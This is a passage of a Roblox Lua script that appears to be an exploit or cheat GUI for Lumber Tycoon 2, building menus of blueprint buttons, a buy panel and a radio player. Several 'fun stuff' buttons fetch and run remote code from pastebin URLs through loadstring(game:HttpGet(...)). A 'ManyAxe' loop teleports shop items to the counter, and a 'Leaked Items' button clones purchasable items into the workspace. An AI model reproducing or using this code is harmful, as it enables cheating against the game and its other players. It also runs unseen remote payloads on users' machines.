InfoText199.Parent = MainFrame
InfoText199.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText199.BackgroundTransparency = 1
InfoText199.Position = UDim2.new(0, 40, 0, 200)
InfoText199.Size = UDim2.new(0, 100, 0, 100)
InfoText199.Image = "rbxassetid://3829956479"
InfoText199.Visible = false

Wall2Thin.MouseEnter:connect(function()
InfoText199.Visible = true
end)

Wall2Thin.MouseLeave:connect(function()
InfoText199.Visible = false
end)

Wall2 = Instance.new("TextButton")
Wall2.Name = "Wall2"
Wall2.Parent = BluePrint1
Wall2.BackgroundColor3 = Color3.new(0, 0, 0)
Wall2.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall2.BackgroundTransparency = 0.6
Wall2.Position = UDim2.new(0, 5, 0, 1154)
Wall2.Size = UDim2.new(0, 173, 0, 20)
Wall2.Font = Enum.Font.Fantasy
Wall2.Text = "Wall2 (80)"
Wall2.TextColor3 = Color3.new(1, 1, 1)
Wall2.TextSize = 14
Wall2.MouseButton1Down:connect(function()
Item.Text = "Wall2"
end)

InfoText200 = Instance.new("ImageLabel")
InfoText200.Name = "ImageLabel"
InfoText200.Parent = MainFrame
InfoText200.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText200.BackgroundTransparency = 1
InfoText200.Position = UDim2.new(0, 40, 0, 200)
InfoText200.Size = UDim2.new(0, 100, 0, 100)
InfoText200.Image = "rbxassetid://3829954883"
InfoText200.Visible = false

Wall2.MouseEnter:connect(function()
InfoText200.Visible = true
end)

Wall2.MouseLeave:connect(function()
InfoText200.Visible = false
end)

Wall2TallCorner = Instance.new("TextButton")
Wall2TallCorner.Name = "Wall2TallCorner"
Wall2TallCorner.Parent = BluePrint1
Wall2TallCorner.BackgroundColor3 = Color3.new(0, 0, 0)
Wall2TallCorner.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall2TallCorner.BackgroundTransparency = 0.6
Wall2TallCorner.Position = UDim2.new(0, 5, 0, 1177)
Wall2TallCorner.Size = UDim2.new(0, 173, 0, 20)
Wall2TallCorner.Font = Enum.Font.Fantasy
Wall2TallCorner.Text = "Wall2 Tall Corner (80)"
Wall2TallCorner.TextColor3 = Color3.new(1, 1, 1)
Wall2TallCorner.TextSize = 14
Wall2TallCorner.MouseButton1Down:connect(function()
Item.Text = "Wall2TallCorner"
end)

InfoText201 = Instance.new("ImageLabel")
InfoText201.Name = "ImageLabel"
InfoText201.Parent = MainFrame
InfoText201.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText201.BackgroundTransparency = 1
InfoText201.Position = UDim2.new(0, 40, 0, 200)
InfoText201.Size = UDim2.new(0, 100, 0, 100)
InfoText201.Image = "rbxassetid://3829959786"
InfoText201.Visible = false

Wall2TallCorner.MouseEnter:connect(function()
InfoText201.Visible = true
end)

Wall2TallCorner.MouseLeave:connect(function()
InfoText201.Visible = false
end)

Wall2TallThin = Instance.new("TextButton")
Wall2TallThin.Name = "Wall2TallThin"
Wall2TallThin.Parent = BluePrint1
Wall2TallThin.BackgroundColor3 = Color3.new(0, 0, 0)
Wall2TallThin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall2TallThin.BackgroundTransparency = 0.6
Wall2TallThin.Position = UDim2.new(0, 5, 0, 1200)
Wall2TallThin.Size = UDim2.new(0, 173, 0, 20)
Wall2TallThin.Font = Enum.Font.Fantasy
Wall2TallThin.Text = "Wall2 Tall Thin (80)"
Wall2TallThin.TextColor3 = Color3.new(1, 1, 1)
Wall2TallThin.TextSize = 14
Wall2TallThin.MouseButton1Down:connect(function()
Item.Text = "Wall2TallThin"
end)

InfoText202 = Instance.new("ImageLabel")
InfoText202.Name = "ImageLabel"
InfoText202.Parent = MainFrame
InfoText202.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText202.BackgroundTransparency = 1
InfoText202.Position = UDim2.new(0, 40, 0, 200)
InfoText202.Size = UDim2.new(0, 100, 0, 100)
InfoText202.Image = "rbxassetid://3829962970"
InfoText202.Visible = false

Wall2TallThin.MouseEnter:connect(function()
InfoText202.Visible = true
end)

Wall2TallThin.MouseLeave:connect(function()
InfoText202.Visible = false
end)

Wall2Tall = Instance.new("TextButton")
Wall2Tall.Name = "Wall2Tall"
Wall2Tall.Parent = BluePrint1
Wall2Tall.BackgroundColor3 = Color3.new(0, 0, 0)
Wall2Tall.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall2Tall.BackgroundTransparency = 0.6
Wall2Tall.Position = UDim2.new(0, 5, 0, 1223)
Wall2Tall.Size = UDim2.new(0, 173, 0, 20)
Wall2Tall.Font = Enum.Font.Fantasy
Wall2Tall.Text = "Wall2 Tall (80)"
Wall2Tall.TextColor3 = Color3.new(1, 1, 1)
Wall2Tall.TextSize = 14
Wall2Tall.MouseButton1Down:connect(function()
Item.Text = "Wall2Tall"
end)

InfoText203 = Instance.new("ImageLabel")
InfoText203.Name = "ImageLabel"
InfoText203.Parent = MainFrame
InfoText203.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText203.BackgroundTransparency = 1
InfoText203.Position = UDim2.new(0, 40, 0, 200)
InfoText203.Size = UDim2.new(0, 100, 0, 100)
InfoText203.Image = "rbxassetid://3829961817"
InfoText203.Visible = false

Wall2Tall.MouseEnter:connect(function()
InfoText203.Visible = true
end)

Wall2Tall.MouseLeave:connect(function()
InfoText203.Visible = false
end)

Wall3Corner = Instance.new("TextButton")
Wall3Corner.Name = "Wall3Corner"
Wall3Corner.Parent = BluePrint1
Wall3Corner.BackgroundColor3 = Color3.new(0, 0, 0)
Wall3Corner.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall3Corner.BackgroundTransparency = 0.6
Wall3Corner.Position = UDim2.new(0, 5, 0, 1246)
Wall3Corner.Size = UDim2.new(0, 173, 0, 20)
Wall3Corner.Font = Enum.Font.Fantasy
Wall3Corner.Text = "Wall3Corner (80)"
Wall3Corner.TextColor3 = Color3.new(1, 1, 1)
Wall3Corner.TextSize = 14
Wall3Corner.MouseButton1Down:connect(function()
Item.Text = "Wall3Corner"
end)

InfoText204 = Instance.new("ImageLabel")
InfoText204.Name = "ImageLabel"
InfoText204.Parent = MainFrame
InfoText204.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText204.BackgroundTransparency = 1
InfoText204.Position = UDim2.new(0, 40, 0, 200)
InfoText204.Size = UDim2.new(0, 100, 0, 100)
InfoText204.Image = "rbxassetid://3829950828"
InfoText204.Visible = false

Wall3Corner.MouseEnter:connect(function()
InfoText204.Visible = true
end)

Wall3Corner.MouseLeave:connect(function()
InfoText204.Visible = false
end)

Wall3Thin = Instance.new("TextButton")
Wall3Thin.Name = "Wall3Thin"
Wall3Thin.Parent = BluePrint1
Wall3Thin.BackgroundColor3 = Color3.new(0, 0, 0)
Wall3Thin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall3Thin.BackgroundTransparency = 0.6
Wall3Thin.Position = UDim2.new(0, 5, 0, 1269)
Wall3Thin.Size = UDim2.new(0, 173, 0, 20)
Wall3Thin.Font = Enum.Font.Fantasy
Wall3Thin.Text = "Wall3 Thin (80)"
Wall3Thin.TextColor3 = Color3.new(1, 1, 1)
Wall3Thin.TextSize = 14
Wall3Thin.MouseButton1Down:connect(function()
Item.Text = "Wall3Thin"
end)

InfoText205 = Instance.new("ImageLabel")
InfoText205.Name = "ImageLabel"
InfoText205.Parent = MainFrame
InfoText205.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText205.BackgroundTransparency = 1
InfoText205.Position = UDim2.new(0, 40, 0, 200)
InfoText205.Size = UDim2.new(0, 100, 0, 100)
InfoText205.Image = "rbxassetid://3829952571"
InfoText205.Visible = false

Wall3Thin.MouseEnter:connect(function()
InfoText205.Visible = true
end)

Wall3Thin.MouseLeave:connect(function()
InfoText205.Visible = false
end)

Wall3 = Instance.new("TextButton")
Wall3.Name = "Wall3"
Wall3.Parent = BluePrint1
Wall3.BackgroundColor3 = Color3.new(0, 0, 0)
Wall3.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall3.BackgroundTransparency = 0.6
Wall3.Position = UDim2.new(0, 5, 0, 1292)
Wall3.Size = UDim2.new(0, 173, 0, 20)
Wall3.Font = Enum.Font.Fantasy
Wall3.Text = "Wall3 (80)"
Wall3.TextColor3 = Color3.new(1, 1, 1)
Wall3.TextSize = 14
Wall3.MouseButton1Down:connect(function()
Item.Text = "Wall3"
end)

InfoText206 = Instance.new("ImageLabel")
InfoText206.Name = "ImageLabel"
InfoText206.Parent = MainFrame
InfoText206.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText206.BackgroundTransparency = 1
InfoText206.Position = UDim2.new(0, 40, 0, 200)
InfoText206.Size = UDim2.new(0, 100, 0, 100)
InfoText206.Image = "rbxassetid://3829951609"
InfoText206.Visible = false

Wall3.MouseEnter:connect(function()
InfoText206.Visible = true
end)

Wall3.MouseLeave:connect(function()
InfoText206.Visible = false
end)


Wall3TallCorner = Instance.new("TextButton")
Wall3TallCorner.Name = "Wall3TallCorner"
Wall3TallCorner.Parent = BluePrint1
Wall3TallCorner.BackgroundColor3 = Color3.new(0, 0, 0)
Wall3TallCorner.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall3TallCorner.BackgroundTransparency = 0.6
Wall3TallCorner.Position = UDim2.new(0, 5, 0, 1315)
Wall3TallCorner.Size = UDim2.new(0, 173, 0, 20)
Wall3TallCorner.Font = Enum.Font.Fantasy
Wall3TallCorner.Text = "Wall3 Tall Corner (80)"
Wall3TallCorner.TextColor3 = Color3.new(1, 1, 1)
Wall3TallCorner.TextSize = 14
Wall3TallCorner.MouseButton1Down:connect(function()
Item.Text = "Wall3TallCorner"
end)

InfoText207 = Instance.new("ImageLabel")
InfoText207.Name = "ImageLabel"
InfoText207.Parent = MainFrame
InfoText207.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText207.BackgroundTransparency = 1
InfoText207.Position = UDim2.new(0, 40, 0, 200)
InfoText207.Size = UDim2.new(0, 100, 0, 100)
InfoText207.Image = "rbxassetid://3829932231"
InfoText207.Visible = false

Wall3TallCorner.MouseEnter:connect(function()
InfoText207.Visible = true
end)

Wall3TallCorner.MouseLeave:connect(function()
InfoText207.Visible = false
end)

Wall3TallThin = Instance.new("TextButton")
Wall3TallThin.Name = "Wall3TallThin"
Wall3TallThin.Parent = BluePrint1
Wall3TallThin.BackgroundColor3 = Color3.new(0, 0, 0)
Wall3TallThin.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall3TallThin.BackgroundTransparency = 0.6
Wall3TallThin.Position = UDim2.new(0, 5, 0, 1338)
Wall3TallThin.Size = UDim2.new(0, 173, 0, 20)
Wall3TallThin.Font = Enum.Font.Fantasy
Wall3TallThin.Text = "Wall3 Tall Thin (80)"
Wall3TallThin.TextColor3 = Color3.new(1, 1, 1)
Wall3TallThin.TextSize = 14
Wall3TallThin.MouseButton1Down:connect(function()
Item.Text = "Wall3TallThin"
end)

InfoText208 = Instance.new("ImageLabel")
InfoText208.Name = "ImageLabel"
InfoText208.Parent = MainFrame
InfoText208.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText208.BackgroundTransparency = 1
InfoText208.Position = UDim2.new(0, 40, 0, 200)
InfoText208.Size = UDim2.new(0, 100, 0, 100)
InfoText208.Image = "rbxassetid://3829934187"
InfoText208.Visible = false

Wall3TallThin.MouseEnter:connect(function()
InfoText208.Visible = true
end)

Wall3TallThin.MouseLeave:connect(function()
InfoText208.Visible = false
end)

Wall3Tall = Instance.new("TextButton")
Wall3Tall.Name = "Wall3Tall"
Wall3Tall.Parent = BluePrint1
Wall3Tall.BackgroundColor3 = Color3.new(0, 0, 0)
Wall3Tall.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wall3Tall.BackgroundTransparency = 0.6
Wall3Tall.Position = UDim2.new(0, 5, 0, 1361)
Wall3Tall.Size = UDim2.new(0, 173, 0, 20)
Wall3Tall.Font = Enum.Font.Fantasy
Wall3Tall.Text = "Wall3 Tall (80)"
Wall3Tall.TextColor3 = Color3.new(1, 1, 1)
Wall3Tall.TextSize = 14
Wall3Tall.MouseButton1Down:connect(function()
Item.Text = "Wall3Tall"
end)

InfoText209 = Instance.new("ImageLabel")
InfoText209.Name = "ImageLabel"
InfoText209.Parent = MainFrame
InfoText209.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText209.BackgroundTransparency = 1
InfoText209.Position = UDim2.new(0, 40, 0, 200)
InfoText209.Size = UDim2.new(0, 100, 0, 100)
InfoText209.Image = "rbxassetid://3829932945"
InfoText209.Visible = false

Wall3Tall.MouseEnter:connect(function()
InfoText209.Visible = true
end)

Wall3Tall.MouseLeave:connect(function()
InfoText209.Visible = false
end)

Item = Instance.new("TextBox")
Item.Name = "Item"
Item.Parent = BuyFrame
Item.BackgroundColor3 = Color3.new(0, 0, 0)
Item.BorderColor3 = Color3.new(1, 0, 0)
Item.Position =  UDim2.new(0, 3, 0, 118)
Item.BackgroundTransparency = 0.6
Item.Size = UDim2.new(0, 164, 0, 20)
Item.Font = Enum.Font.Fantasy
Item.Text = "Item Name"
Item.TextColor3 = Color3.new(0, 1, 0)
Item.TextSize = 14

Quan = Instance.new("TextBox")
Quan.Name = "Quan"
Quan.Parent = BuyFrame
Quan.BackgroundColor3 = Color3.new(0, 0, 0)
Quan.BorderColor3 = Color3.new(1, 0, 0)
Quan.Position =  UDim2.new(0, 3, 0, 141)
Quan.BackgroundTransparency = 0.6
Quan.Size = UDim2.new(0, 82, 0, 20)
Quan.Font = Enum.Font.Fantasy
Quan.Text = "Quantity"
Quan.TextColor3 = Color3.new(0, 1, 0)
Quan.TextSize = 14

Manyon = Instance.new("TextButton")
Manyon.Name = "Manyon"
Manyon.Parent = BuyFrame
Manyon.BackgroundColor3 = Color3.new(0, 0, 0)
Manyon.BorderColor3 = Color3.new(1, 0, 0)
Manyon.Position =  UDim2.new(0, 3, 0, 310)
Manyon.BackgroundTransparency = 0.6
Manyon.Size = UDim2.new(0, 82, 0, 20)
Manyon.Font = Enum.Font.Fantasy
Manyon.Text = "ManyAxe On"
Manyon.TextColor3 = Color3.new(1, 1, 1)
Manyon.TextSize = 14
Manyon.MouseButton1Click:connect(function()
makesound("rbxassetid://156785206")
_G.Tp = true
print("TreKzr`s Epic ManyAxe Method lol")
while _G.Tp do
    wait(.1)
    for _,v in pairs(game:GetService("Workspace").Stores:GetChildren())do
        if v.Name == "ShopItems" then
            for _,x in pairs(v:GetChildren()) do 
                if x:FindFirstChild("BoxItemName") then
                if tostring(x.BoxItemName.Value) == "ManyAxe" then
                    if x.Main then
                        x.Main.CFrame = game:GetService("Workspace").Stores.FurnitureStore.Counter.CFrame
            wait()
            end
        end
    end    
end
end
end
end
end)

Manyoff = Instance.new("TextButton")
Manyoff.Name = "Manyoff"
Manyoff.Parent = BuyFrame
Manyoff.BackgroundColor3 = Color3.new(0, 0, 0)
Manyoff.BorderColor3 = Color3.new(1, 0, 0)
Manyoff.Position =  UDim2.new(0, 85, 0, 310)
Manyoff.BackgroundTransparency = 0.6
Manyoff.Size = UDim2.new(0, 82, 0, 20)
Manyoff.Font = Enum.Font.Fantasy
Manyoff.Text = "ManyAxe Off"
Manyoff.TextColor3 = Color3.new(1, 1, 1)
Manyoff.TextSize = 14
Manyoff.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")
_G.Tp = false
end)

Btoolamenu = Instance.new("ImageButton")
Btoolamenu.Name = "Btoolamenu"
Btoolamenu.Parent = Picker
Btoolamenu.BackgroundColor3 = Color3.new(0, 0, 0)
Btoolamenu.BorderColor3 = Color3.new(0, 0, 0)
Btoolamenu.Position = UDim2.new(0, 15, 0,515)
Btoolamenu.Size = UDim2.new(0, 80, 0, 80)
Btoolamenu.ZIndex = 3
Btoolamenu.Image = "rbxassetid://4892950263"
Btoolamenu.ScaleType = Enum.ScaleType.Crop
CurrentItem.Image = "rbxassetid://4892950263"
Btoolamenu.MouseButton1Click:Connect(function()
  makesound("rbxassetid://156785206")
end)

LT2GUI2Frame = Instance.new("Frame")
LT2GUI2Frame.Name = "LT2GUI2Frame"
LT2GUI2Frame.Parent = MenuFrame
LT2GUI2Frame.BorderSizePixel = 1
LT2GUI2Frame.BackgroundTransparency = 0.5
LT2GUI2Frame.BorderColor3 = Color3.new(0, 0, 0)
LT2GUI2Frame.BackgroundColor3 = Color3.new(0, 0, 0)
LT2GUI2Frame.Size = UDim2.new(0, 170, 0, 278)
LT2GUI2Frame.Visible = false

FunStuffHOVER = Instance.new("TextButton")
FunStuffHOVER.Name = "FunStuffHOVER"
FunStuffHOVER.Parent = LT2GUI2Frame
FunStuffHOVER.BackgroundColor3 = Color3.new(0, 0, 0)
FunStuffHOVER.BackgroundTransparency = 0.6
FunStuffHOVER.BorderColor3 = Color3.new(1, 0, 0)
FunStuffHOVER.Position =  UDim2.new(0, 3, 0, 3)
FunStuffHOVER.Size = UDim2.new(0, 165, 0, 20)
FunStuffHOVER.Font = Enum.Font.Fantasy
FunStuffHOVER.Text = "Hover Board"
FunStuffHOVER.TextColor3 = Color3.new(1, 1, 1)
FunStuffHOVER.TextSize = 14
FunStuffHOVER.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")

loadstring(game:HttpGet(('https://pastebin.com/raw/DabYym5D'),true))()

end)

FunStuffTHOMAS = Instance.new("TextButton")
FunStuffTHOMAS.Name = "FunStuffTHOMAS"
FunStuffTHOMAS.Parent = LT2GUI2Frame
FunStuffTHOMAS.BackgroundColor3 = Color3.new(0, 0, 0)
FunStuffTHOMAS.BorderColor3 = Color3.new(1, 0, 0)
FunStuffTHOMAS.BackgroundTransparency = 0.6
FunStuffTHOMAS.Position =  UDim2.new(0, 3, 0, 26)
FunStuffTHOMAS.Size = UDim2.new(0, 165, 0, 20)
FunStuffTHOMAS.Font = Enum.Font.Fantasy
FunStuffTHOMAS.Text = "Thomas The Tank"
FunStuffTHOMAS.TextColor3 = Color3.new(1, 1, 1)
FunStuffTHOMAS.TextSize = 14
FunStuffTHOMAS.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")
loadstring(game:HttpGet(('http://pastebin.com/raw/tMr759X7'),true))()

end)

FunStuffPOLICE = Instance.new("TextButton")
FunStuffPOLICE.Name = "FunStuffPOLICE"
FunStuffPOLICE.Parent = LT2GUI2Frame
FunStuffPOLICE.BackgroundColor3 = Color3.new(0, 0, 0)
FunStuffPOLICE.BorderColor3 = Color3.new(1, 0, 0)
FunStuffPOLICE.Position =  UDim2.new(0, 3, 0, 49)
FunStuffPOLICE.BackgroundTransparency = 0.6
FunStuffPOLICE.Size = UDim2.new(0, 165, 0, 20)
FunStuffPOLICE.Font = Enum.Font.Fantasy
FunStuffPOLICE.Text = "Police Man"
FunStuffPOLICE.TextColor3 = Color3.new(1, 1, 1)
FunStuffPOLICE.TextSize = 14
FunStuffPOLICE.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")
loadstring(game:HttpGet(('https://pastebin.com/raw/FR9Fzcqw'),true))()

end)

FunStuffSPRAY = Instance.new("TextButton")
FunStuffSPRAY.Name = "FunStuffSPRAY"
FunStuffSPRAY.Parent = LT2GUI2Frame
FunStuffSPRAY.BackgroundColor3 = Color3.new(0, 0, 0)
FunStuffSPRAY.BorderColor3 = Color3.new(1, 0, 0)
FunStuffSPRAY.Position =  UDim2.new(0, 3, 0, 72)
FunStuffSPRAY.BackgroundTransparency = 0.6
FunStuffSPRAY.Size = UDim2.new(0, 165, 0, 20)
FunStuffSPRAY.Font = Enum.Font.Fantasy
FunStuffSPRAY.Text = "Spray Can"
FunStuffSPRAY.TextColor3 = Color3.new(1, 1, 1)
FunStuffSPRAY.TextSize = 14
FunStuffSPRAY.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")
loadstring(game:HttpGet(('http://pastebin.com/raw/raYkCjyy'),true))()

end)

FunStuffCOCA = Instance.new("TextButton")
FunStuffCOCA.Name = "FunStuffCOCA"
FunStuffCOCA.Parent = LT2GUI2Frame
FunStuffCOCA.BackgroundColor3 = Color3.new(0, 0, 0)
FunStuffCOCA.BorderColor3 = Color3.new(1, 0, 0)
FunStuffCOCA.Position =  UDim2.new(0, 3, 0, 95)
FunStuffCOCA.BackgroundTransparency = 0.6
FunStuffCOCA.Size = UDim2.new(0, 165, 0, 20)
FunStuffCOCA.Font = Enum.Font.Fantasy
FunStuffCOCA.Text = "Coca Cola"
FunStuffCOCA.TextColor3 = Color3.new(1, 1, 1)
FunStuffCOCA.TextSize = 14
FunStuffCOCA.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")
loadstring(game:HttpGet(('https://pastebin.com/raw/nMu90Kdq'),true))()

end)

FunStuffLEAKED = Instance.new("TextButton")
FunStuffLEAKED.Name = "FunStuffLEAKED"
FunStuffLEAKED.Parent = LT2GUI2Frame
FunStuffLEAKED.BackgroundColor3 = Color3.new(0, 0, 0)
FunStuffLEAKED.BorderColor3 = Color3.new(1, 0, 0)
FunStuffLEAKED.Position =  UDim2.new(0, 3, 0, 118)
FunStuffLEAKED.BackgroundTransparency = 0.6
FunStuffLEAKED.Size = UDim2.new(0, 165, 0, 20)
FunStuffLEAKED.Font = Enum.Font.Fantasy
FunStuffLEAKED.Text = "Leaked Items"
FunStuffLEAKED.TextColor3 = Color3.new(1, 1, 1)
FunStuffLEAKED.TextSize = 14
FunStuffLEAKED.MouseButton1Down:connect(function() 
  makesound("rbxassetid://156785206")

game.ReplicatedStorage.Purchasables:Clone().Parent = game.Workspace.PlayerModels
end)

FunStuffFLASH = Instance.new("TextButton")
FunStuffFLASH.Name = "FunStuffFLASH"
FunStuffFLASH.Parent = LT2GUI2Frame
FunStuffFLASH.BackgroundColor3 = Color3.new(0, 0, 0)
FunStuffFLASH.BorderColor3 = Color3.new(1, 0, 0)
FunStuffFLASH.Position =  UDim2.new(0, 3, 0, 141)
FunStuffFLASH.BackgroundTransparency = 0.6
FunStuffFLASH.Size = UDim2.new(0, 165, 0, 20)
FunStuffFLASH.Font = Enum.Font.Fantasy
FunStuffFLASH.Text = "Flash Light"
FunStuffFLASH.TextColor3 = Color3.new(1, 1, 1)
FunStuffFLASH.TextSize = 14
FunStuffFLASH.MouseButton1Click:Connect(function()
  makesound("rbxassetid://156785206")
   FunStuffFLASH.BackgroundColor3 = Color3.new(0.14902, 0.490196, 0.109804)
-- Created by supersonicfan111
local p=game:GetService"Players".LocalPlayer
local c=p.Character
local surf='SmoothNoOutlines'
if not c then error'Cannot find character, please respawn, then rerun the script' end

-- Flashlight Handle
local hand=Instance.new"Part"
hand.BrickColor=BrickColor.DarkGray()
hand.Parent=c
hand.Anchored=false
hand.Locked=true
hand.CanCollide=false
hand.FormFactor='Custom'
hand.Size=Vector3.new(1,1,2)
hand.TopSurface,hand.BottomSurface=surf,surf

-- Torch Effect
local fe=Instance.new"Part"
fe.BrickColor=BrickColor.new"Black"
fe.Parent=c
fe.Anchored=false
fe.Locked=true
fe.CanCollide=false
fe.FormFactor='Custom'
fe.Size=Vector3.new(.8,.8,.2)
fe.TopSurface,hand.BottomSurface=surf,surf

-- Welding stuff

-- Flash to Right Arm
local weld1=Instance.new"Weld"
weld1.Parent=hand
weld1.Part0=hand
weld1.Part1=c['Right Arm']
weld1.C0=CFrame.new(0, 1.5, 0)

-- Torch Effect to Flash
local weld2=Instance.new"Weld"
weld2.Parent=hand
weld2.Part0=hand
weld2.Part1=fe
weld2.C0=CFrame.new(0, 0, 1)

-- Right Arm Weld
local ra=Instance.new"Weld"
ra.Parent=c['Torso']
ra.Part0=c['Right Arm']
ra.Part1=c['Torso']
ra.C0=CFrame.new(-1.5,1,0)*CFrame.Angles(math.rad(180),0,0)



-- Flashlight Functionality

local flashlightOn = false
local Battery=50

-- Handles turning the flashlight on/off
p:GetMouse().Button1Down:connect(function()
	flashlightOn=not flashlightOn
	if flashlightOn then
		fe.BrickColor=BrickColor.new"New Yeller"
		light=Instance.new"SurfaceLight"
		light.Parent=fe
		light.Range=1000
		light.Face="Back"
		light.Brightness=10
		fe.Material="Neon"
	else
		fe.BrickColor=BrickColor.new"Black"
		if light then light:destroy() end
		fe.Material="SmoothPlastic"
	end
end)

 -- Battery Modules
 
-- Depleting and Charging
spawn(function()
	while wait(1) do
		if flashlightOn then
			if Battery > 0 then
				Battery=Battery-1
			end
		else
			if Battery < 100 then
				Battery=Battery+1
			end
		end
		print(Battery)
	end
end)

-- Turning off flashlight if the battery is too low
spawn(function()
	while wait() do
		if Battery <= 0 then
			flashlightOn=false
			if light then light:destroy() end
			fe.BrickColor=BrickColor.new"Black"
			fe.Material="SmoothPlastic"
		end
	end
end)

local stepped = game:GetService'RunService'.RenderStepped
end)

OPFinality1 = Instance.new("TextButton")
OPFinality1.Name = "OPFinality1"
OPFinality1.Parent = LT2GUI2Frame
OPFinality1.BackgroundColor3 = Color3.new(0, 0, 0)
OPFinality1.BorderColor3 = Color3.new(1, 0, 0)
OPFinality1.Position =  UDim2.new(0, 3, 0, 164)
OPFinality1.BackgroundTransparency = 0.6
OPFinality1.Size = UDim2.new(0, 165, 0, 20)
OPFinality1.Font = Enum.Font.Fantasy
OPFinality1.Text = "OP Finality"
OPFinality1.TextColor3 = Color3.new(1, 1, 1)
OPFinality1.TextSize = 14
OPFinality1.MouseButton1Click:connect(function()
  makesound("rbxassetid://156785206")
loadstring(game:HttpGet(('https://pastebin.com/raw/hkQ5HfV5'),true))()

end)

Radio = Instance.new("ImageButton")
Radio.Name = "Radio"
Radio.Parent = Picker
Radio.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
Radio.BorderColor3 = Color3.new(0, 0, 0)
Radio.Position = UDim2.new(0, 15, 0, 600)
Radio.Size = UDim2.new(0, 80, 0, 80)
Radio.ZIndex = 3
Radio.Image = "rbxassetid://4892951279"
Radio.ScaleType = Enum.ScaleType.Crop
Radio.MouseButton1Click:Connect(function()
CurrentItem.Image = "rbxassetid://4892951279"
  makesound("rbxassetid://156785206")
AIntroImage.Visible = false
AIntroImage1.Visible = false
AIntroImage2.Visible = false
AIntroImage3.Visible = false
TimesFrame.Visible = false
end)

RadioFrame = Instance.new("Frame")
RadioFrame.Name = "RadioFrame"
RadioFrame.Parent = MenuFrame
RadioFrame.BorderSizePixel = 1
RadioFrame.BackgroundTransparency = 1
RadioFrame.BorderColor3 = Color3.new(0, 0, 0)
RadioFrame.BackgroundColor3 = Color3.fromRGB(151, 0, 0)
RadioFrame.Size = UDim2.new(0, 170, 0, 255)
RadioFrame.Visible = false

RadioLabel = Instance.new("ImageLabel")
RadioLabel.Name = "RadioLabel"
RadioLabel.Parent = RadioFrame
RadioLabel.BackgroundTransparency = 1
RadioLabel.BackgroundColor3 = Color3.new(1, 1, 1)
RadioLabel.BorderColor3 = Color3.new(0, 0, 0)
RadioLabel.BorderSizePixel = 2
RadioLabel.Size = UDim2.new(0, 200, 0, 200)
RadioLabel.Position = UDim2.new(0, 0, 0, 0)
RadioLabel.Image = "rbxassetid://4306993084"

Stop = Instance.new("TextButton")
Stop.Name = "Stop"
Stop.Parent = RadioFrame
Stop.BackgroundColor3 = Color3.new(0, 0, 0)
Stop.BackgroundTransparency = 1
Stop.Position = UDim2.new(0, 145, 0, 138)
Stop.Size = UDim2.new(0, 30, 0, 30)
Stop.Font = Enum.Font.SourceSans
Stop.FontSize = Enum.FontSize.Size18
Stop.Text = ""
Stop.TextSize = 15
Stop.TextScaled = true
Stop.TextWrapped = true
Stop.TextColor3 = Color3.fromRGB(249, 233, 153)

InfoText36 = Instance.new("TextLabel")
InfoText36.Name = "InfoText2"
InfoText36.Parent = MainFrame
InfoText36.BackgroundColor3 = Color3.fromRGB(151, 0, 0)
InfoText36.BorderColor3 = Color3.new(0, 0, 0)
InfoText36.BackgroundTransparency = 0.2
InfoText36.Position = UDim2.new(0, 230, 0, 170)
InfoText36.Size = UDim2.new(0, 80, 0, 20)
InfoText36.TextColor3 = Color3.new(0, 0, 0)
InfoText36.Font = Enum.Font.Fantasy
InfoText36.Text =  "Stop Track."
InfoText36.TextSize = 17
InfoText36.TextWrapped = true
InfoText36.Visible = false
InfoText36.ZIndex = 7
InfoText36.TextYAlignment = Enum.TextYAlignment.Top

Stop.MouseEnter:connect(function()
InfoText36.Visible = true
end)

Stop.MouseLeave:connect(function()
InfoText36.Visible = false
end)

Vol = Instance.new("TextButton")
Vol.Name = "Vol"
Vol.Parent = RadioFrame
Vol.BackgroundColor3 = Color3.new(0, 0, 0)
Vol.BackgroundTransparency = 1
Vol.Position = UDim2.new(0, 87, 0, 111)
Vol.Size = UDim2.new(0, 30, 0, 12)
Vol.Font = Enum.Font.SourceSans
Vol.FontSize = Enum.FontSize.Size18
Vol.Text = "Volume"
Vol.TextSize = 12
Vol.TextScaled = true
Vol.TextWrapped = true
Vol.TextColor3 = Color3.fromRGB(249, 233, 153)

scrgui = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)
sound = Instance.new("Sound",scrgui)


fr2tb1 = Instance.new("TextBox")
fr2tl2 = Instance.new("TextLabel")
vslz = Instance.new("Frame")

--

fr3tl2tb1 = Instance.new("TextButton")
fr3tl3 = Instance.new("TextLabel")
fr3tl3tb1 = Instance.new("TextBox",fr3tl3)

--
scrf = Instance.new("ScrollingFrame")
looped = false

function clr(num1, num2, num3) --color3 converter function
	local color1 = num1/255
	local color2 = num2/255
	local color3 = num3/255
	return Color3.new(color1, color2, color3)
end

textcolor = clr(255,255,255)
textcolor2 = clr(0,0,0)

--music

local music = { --25
	"829801270",
	"467369212",
	"1978951123",
	"2916513007",
	"4273337023",
	"4211262527",
	"4255029113",
	"4291241756",
	"2911086781",
	"3407002205",
	"4282589796",
	"2930724233",
	"3809358736",
	"4250558781",
	"4057096436",
	"4094517246",
